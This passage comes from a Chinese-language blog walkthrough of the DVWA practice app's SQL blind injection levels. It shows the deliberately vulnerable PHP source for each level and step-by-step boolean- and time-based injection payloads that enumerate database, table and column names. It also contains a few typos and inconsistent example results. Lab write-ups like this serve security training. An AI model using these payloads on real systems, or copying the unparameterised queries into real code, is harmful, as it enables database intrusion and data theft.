class="string">"___mysqli_ston"</span>],  $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从源码中可以看到Low级别的代码对参数id没有任何检查、过滤，存在明显的sql注入漏洞，同时sql语句查询返回只有两种结果。</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span> <span class="title">ID</span> exists <span class="keyword">in</span> the database.</span><br></pre></td></tr></table></figure>

<p>与</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span> ID <span class="keyword">is</span> MISSING <span class="keyword">from</span> the <span class="keyword">database</span>.</span><br></pre></td></tr></table></figure>

<p>因此是sql盲注漏洞。</p>
<p>漏洞利用</p>
<p>首先演示基于布尔的盲注</p>
<p>1.判断是否存在注入，注入的字符型还是数字型</p>
<p>id=1，显示相应用户存在:</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/68.png" alt></p>
<p>输入1’ or 1=1#显示存在</p>
<p>说明存在字符型的sql盲注</p>
<p>2.猜解当前数据库名</p>
<p>想要猜解数据库名，先要猜解数据名的长度，然后逐个猜解字符</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>=<span class="number">1</span>' <span class="keyword">and</span> <span class="built_in">length</span>(database())=<span class="number">1</span> <span class="comment">#,显示不存在</span></span><br><span class="line"><span class="built_in">id</span>=<span class="number">1</span>' <span class="keyword">and</span> <span class="built_in">length</span>(database())=<span class="number">2</span> <span class="comment">#,显示不存在</span></span><br><span class="line"><span class="built_in">id</span>=<span class="number">1</span>' <span class="keyword">and</span> <span class="built_in">length</span>(database())=<span class="number">3</span> <span class="comment">#,显示不存在</span></span><br><span class="line"><span class="built_in">id</span>=<span class="number">1</span>' <span class="keyword">and</span> <span class="built_in">length</span>(database())=<span class="number">4</span> <span class="comment">#,显示存在</span></span><br></pre></td></tr></table></figure>

<p>得到数据库名长度为4</p>
<p>采用二分法猜解数据库名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39; and ascii(substr(database(),1,1))&gt;97#</span><br><span class="line">&#x2F;&#x2F;显示存在，说明数据库名的第一个字符的ascii值大于97（即a）</span><br><span class="line">id&#x3D;1&#39; and ascii(substr(database(),1,1))&lt;122#</span><br><span class="line">&#x2F;&#x2F;显示存在，说明数据库名的第一个字符的ascii值小于122（即z）</span><br><span class="line">id&#x3D;1’ and ascii(substr(database(),1,1))&lt;109#</span><br><span class="line">&#x2F;&#x2F;显示存在，说明数据库名的第二个字符的ascii值小于109（即m）</span><br><span class="line">id&#x3D;1&#39; and ascii(substr(database(),1,1))&lt;103#</span><br><span class="line">&#x2F;&#x2F;显示存在，说明数据库名的第一个字符的ascii值小于103（即g）</span><br><span class="line">id&#x3D;1&#39; and ascii(substr(database(),1,1))&lt;100#</span><br><span class="line">&#x2F;&#x2F;显示不存在，说明数据库的第一个字符的ascii值不小于100（即d）</span><br><span class="line">id&#x3D;1&#39; and ascii(substr(database(),1,1))&gt;100#</span><br><span class="line">&#x2F;&#x2F;显示不存在，说明数据库的第一个字符的ascii值不大于100（即d），所以数据库名的第一个字符的ascii值为100，即小写字母d</span><br><span class="line"></span><br><span class="line">id&#x3D;1’ and ascii(substr(database(),2,1))&gt;97#</span><br><span class="line">&#x2F;&#x2F;显示存在，说明数据库名的第二个字符的ascii值大于97（即a）</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>重复上述步骤，就可猜解出完整的数据库名(dvwa)</p>
<p>3.猜解数据库名的表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39; and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;1# &#x2F;&#x2F;显示不存在</span><br><span class="line">id&#x3D;1&#39; and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;2# &#x2F;&#x2F;显示存在</span><br></pre></td></tr></table></figure>

<p>说明数据库中共有两个表，接着猜解每个表的表名：</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>=<span class="number">1</span>' <span class="keyword">and</span> <span class="built_in">length</span>(substr((select table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span><span class="comment"># //显示不存在</span></span><br><span class="line"><span class="built_in">id</span>=<span class="number">1</span>' <span class="keyword">and</span> <span class="built_in">length</span>(substr((select table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">2</span><span class="comment"># //显示不存在</span></span><br><span class="line">...</span><br><span class="line"><span class="built_in">id</span>=<span class="number">1</span>' <span class="keyword">and</span> <span class="built_in">length</span>(substr((select table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">9</span><span class="comment">#  //显示存在，说明第一个表名长度为g</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span>=<span class="number">1</span>' <span class="keyword">and</span> <span class="built_in">length</span>(substr((select table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span><span class="comment">#  //显示不存在</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>重复上述步骤，即可猜解出两个表名(guestbook、users)。</p>
<p>4.猜测表中的字段名</p>
<p>首先猜解表中字段的数量</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1'</span> and (<span class="function"><span class="keyword">select</span> <span class="title">count</span>(<span class="params">column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span>=<span class="string">'users'</span>)=<span class="number">1</span><span class="meta">#  //显示不存在</span></span><br><span class="line">...</span><br><span class="line">id=<span class="number">1'</span> and (<span class="function"><span class="keyword">select</span> <span class="title">count</span>(<span class="params">column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span>=<span class="string">'users'</span>)=<span class="number">8</span><span class="meta"># //显示存在</span></span><br></pre></td></tr></table></figure>

<p>说明users表有8个字段，接着挨个猜解字段名：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1'</span> <span class="function">and <span class="title">length</span>(<span class="params">substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> limit <span class="number">0</span>,<span class="number">1</span></span>),1))</span>=<span class="number">1</span><span class="meta">#  //显示不存在</span></span><br><span class="line">...</span><br><span class="line">id=<span class="number">1'</span> <span class="function">and <span class="title">length</span>(<span class="params">substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> limit <span class="number">0</span>,<span class="number">1</span></span>),1))</span>=<span class="number">7</span><span class="meta">#  //显示存在，说明users表的第一个字段为7个字符长度</span></span><br><span class="line"></span><br><span class="line">id=<span class="number">1'</span> <span class="function">and <span class="title">length</span>(<span class="params">substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> limit <span class="number">1</span>,<span class="number">1</span></span>),1))</span>=<span class="number">1</span><span class="meta">#  //显示不存在</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>重复上述步骤，猜解所有字段名的长度</p>
<p>采用二分法，即可猜解出所有字段名。</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span># <span class="comment">//显示不存在</span></span><br><span class="line">...</span><br><span class="line">id=<span class="number">1</span>' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">97</span>#</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">id=<span class="number">1</span>' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span>#</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>

<p>5.猜解数据</p>
<p>同样采用二分法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1' and ord(mid((<span class="keyword">select</span> <span class="keyword">ifnull</span>(<span class="keyword">cast</span>(first_name <span class="keyword">as</span> <span class="built_in">char</span>),<span class="number">0x20</span>) <span class="keyword">from</span> dvwa.users <span class="keyword">order</span> <span class="keyword">by</span> user_id <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span><span class="comment"># //查看first_name列中第一行的第一个字符ascii是否大于97</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>基于时间的盲注</p>
<p>1.判断是否存在注入，注入是字符型还是数字型</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>' <span class="keyword">and</span> <span class="built_in">sleep</span>(<span class="number">5</span>)<span class="meta">#  <span class="comment">//明显延迟</span></span></span><br><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="built_in">sleep</span>(<span class="number">5</span>)<span class="meta">#  <span class="comment">//没有延迟</span></span></span><br></pre></td></tr></table></figure>

<p>说明存在字符型的基于时间的盲注</p>
<p>2.猜解当前数据库名</p>
<p>首先猜解数据名的长度</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>' and if(length(database())=<span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)# 没有延迟</span><br><span class="line">id=<span class="number">1</span>' and if(length(database())=<span class="number">2</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)# 没有延迟</span><br><span class="line">id=<span class="number">1</span>' and if(length(database())=<span class="number">3</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)# 没有延迟</span><br><span class="line">id=<span class="number">1</span>' and if(length(database())=<span class="number">4</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)# 明显延迟</span><br></pre></td></tr></table></figure>

<p>说明数据库名长度为4个字符。接着使用二分法猜解数据库名：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>' and if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)# 明显延迟</span><br><span class="line">...</span><br><span class="line">id=<span class="number">1</span>' and if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))&lt;<span class="number">100</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)# 没有延迟</span><br><span class="line">id=<span class="number">1</span>’ and if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">100</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)# 没有延迟</span><br><span class="line">说明数据库名的第一个字符为小写字母d</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>重复上述步骤，即可猜解出数据库名</p>
<p>3.猜解数据库中的表名</p>
<p>首先猜解数据库中表的数量</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>=<span class="number">1</span>' <span class="keyword">and</span> <span class="keyword">if</span>((select <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=database())=<span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)<span class="comment"># 没有延迟</span></span><br><span class="line"><span class="built_in">id</span>=<span class="number">1</span>' <span class="keyword">and</span> <span class="keyword">if</span>((select <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=database())=<span class="number">2</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">#  明显延迟</span></span><br></pre></td></tr></table></figure>

<p>说明数据库中有两个表，然后猜解表名</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)# 没有延迟</span><br><span class="line">...</span><br><span class="line">id=<span class="number">1</span>' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">9</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)# 明显延迟</span><br></pre></td></tr></table></figure>

<p>说明第一个表的长度为9个字符</p>
<p>采用二分法即可猜解出表名。</p>
<p>4.猜解表中的字段名</p>
<p>首先猜解表中字段的数量</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1'</span> <span class="function">and <span class="title">if</span>(<span class="params">(<span class="keyword">select</span> count(column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span>=<span class="string">'users'</span>)=<span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)<span class="meta"># </span></span><br><span class="line"><span class="comment">//没有延迟</span></span><br><span class="line">...</span><br><span class="line">id=<span class="number">1'</span> <span class="function">and <span class="title">if</span>(<span class="params">(<span class="keyword">select</span> count(column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span>=<span class="string">'users'</span>)=<span class="number">8</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)<span class="meta">#</span></span><br><span class="line"><span class="comment">//明显延迟</span></span><br></pre></td></tr></table></figure>

<p>说明users表中有8个字段，接着猜解字段名：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>' and if(length(substr((select column_name from information_schema.columns where table_name='users' limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)# 没有延迟</span><br><span class="line">id=<span class="number">1</span>' and if(length(substr((select column_name from information_schema.columns where table_name='users' limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)#  明显延迟</span><br></pre></td></tr></table></figure>

<p>说明users表的第一个字段长度为7个字符，采用二分法即可猜解出各个字段名。</p>
<p>5.猜解数据</p>
<p>同样采用二分法</p>
<h3 id="Medium-7"><a href="#Medium-7" class="headerlink" title="Medium"></a>Medium</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">'id'</span> ];</span><br><span class="line">    $id = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $id ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号<code>\x00</code>,<code>\n</code>,<code>\r</code>,<code>\</code>,<code>&#39;</code>,<code>&quot;</code>,<code>\x1a</code>进行转义，同时前端页面设置下拉选项，一次控制用户的输入。</p>
<p>漏洞利用</p>
<p>虽然前端使用了下拉选择菜单，可以通过抓包修改参数id，提交恶意构造的查询参数。这边简要演示一下，其余的参考上面的。</p>
<p>基于布尔的盲注</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">抓包改参数id=<span class="number">1</span> <span class="keyword">and</span> length(<span class="keyword">database</span>())=<span class="number">4</span>#,明显存在，说明数据库名的长度为<span class="number">4</span>个字符</span><br><span class="line">抓包改参数id=<span class="number">1</span> <span class="keyword">and</span> length(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">9</span># 显示存在，说明数据中的第一个表名长度为<span class="number">9</span>个字符</span><br><span class="line">抓包改参数id=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> count <span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="number">0</span>×<span class="number">7573657273</span>)=<span class="number">8</span># 明显存在，说明users表中有<span class="number">8</span>个字段</span><br></pre></td></tr></table></figure>

<p>基于时间的盲注</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">抓包改参数id=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(length(database())=<span class="number">4</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)# 明显延迟，说明数据库名的长度为<span class="number">4</span>个字符</span><br><span class="line">抓包改参数id=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(length(substr((select table_name <span class="keyword">from</span> information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">9</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)#  明显延迟，说明数据中的第一个表名长度为<span class="number">9</span>个字符</span><br><span class="line">抓包改参数id=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>((select count(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="number">0</span>×<span class="number">7573657273</span>)=<span class="number">8</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)# 明显延迟，说明users表有<span class="number">8</span>个字段</span><br></pre></td></tr></table></figure>

<h3 id="High-7"><a href="#High-7" class="headerlink" title="High"></a>High</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_COOKIE[ <span class="string">'id'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_COOKIE[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount</span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间盲注，同时在sql查询语句中添加了limit 1，以此控制只输出一个结果。</p>
<p>漏洞利用</p>
<p>虽然添加了limit 1，但是可通过#将其注释掉，但是由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，此处只演示基于布尔的盲注</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">抓包将cookie中参数id改为<span class="number">1</span>' and length(database())=<span class="number">4</span># 显示存在，说明数据库名的长度为<span class="number">4</span>个字符</span><br><span class="line">抓包将cookie中参数id改为<span class="number">1</span>' and length(substr((select table_name from information_schema.tables where tabke_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">9</span># 显示存在，说明数据库中的第一个表名长度为<span class="number">9</span>个字符</span><br><span class="line">抓包将cookie中参数id改为<span class="number">1</span>' and (select count(column_name) from information_schema.columns where table_name=<span class="number">0</span>×<span class="number">7573657273</span>)=<span class="number">8</span>#  显示存在，说明users表有<span class="number">8</span>个字段</span><br></pre></td></tr></table></figure>

<h4 id="Impossible-7"><a href="#Impossible-7" class="headerlink" title="Impossible"></a>Impossible</h4><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = 